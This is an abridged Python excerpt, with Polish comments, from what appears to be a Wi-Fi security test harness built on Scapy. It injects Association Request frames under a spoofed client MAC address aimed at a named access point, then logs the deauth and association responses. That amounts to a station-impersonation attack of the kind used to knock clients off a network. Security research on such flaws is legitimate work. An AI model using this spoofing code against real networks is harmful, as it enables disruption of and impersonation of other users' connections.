...
class QueueSAQuery(Test):
	...
	TARGET_AP_BSSID = "06:86:f4:50:c8:70"  # MAC realnego AP (z twoich logów)
	TARGET_AP_SSID = "testnetwork-samsung"  # SSID realnego AP
	SPOOFED_MAC = "ec:63:d7:89:d5:5a"  # MAC pod który się podszywasz
	# ============================================
	...
	def receive(self, station, frame):
		...
		log(
			STATUS, f"Type: {frame.sprintf('%Dot11.type%')}, Subtype: {frame.sprintf('%Dot11.subtype%')}", color="orange")
		...
		if frame.haslayer(Dot11Deauth):
			...
			log(
				STATUS, f">>> Association Response (status={status}) <<<", color="yellow")
			if status == 0:
			...
			log(
				STATUS, f">>> Other management frame: {frame.sprintf('%Dot11.subtype%')} <<<", color="yellow")
	...
	def generate(self, station):
		...
		# RSN
		payload /= Raw(bytes.fromhex("301a0100000fac040100000fac040100000fac08c0000000000fac06"))

		log(STATUS, "Injecting frame 1 with spoofed MAC: " +
		    self.SPOOFED_MAC, color="cyan")

		# Pierwsza ramka Association-request z SPOOFED MAC
		frame = Dot11(type="Management", subtype=0, addr1=self.TARGET_AP_BSSID,
		              addr2=self.SPOOFED_MAC, addr3=self.TARGET_AP_BSSID)
		...
		log(STATUS, "Injecting frame 2 with spoofed MAC: " +
		    self.SPOOFED_MAC, color="cyan")
